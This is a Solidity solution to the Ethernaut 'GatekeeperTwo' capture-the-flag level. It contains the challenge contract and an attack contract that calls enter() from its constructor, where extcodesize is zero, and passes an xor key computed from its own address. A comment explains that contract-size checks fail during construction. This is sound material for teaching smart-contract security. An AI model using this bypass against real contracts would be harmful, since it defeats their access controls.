// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
	Only thing to learn here is that during constructor calls of a contract, its code size is
	nil. Any checks related to contract size should take into account this.
	Other than that `gateOne` is same as L13,
	`gateTwo` can be passed if we call a contract from the constructor, in this case, contract code size is zero.
	`gateThree` key can be computed easily as for xor operator: if A^B = C, A^C = B.
 */

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoHack {
    GatekeeperTwo g;
    constructor(address gAdd) public {
        g = GatekeeperTwo(gAdd);
        // uint64 aMax = uint64(0) - 1;
        g.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)));
    }
}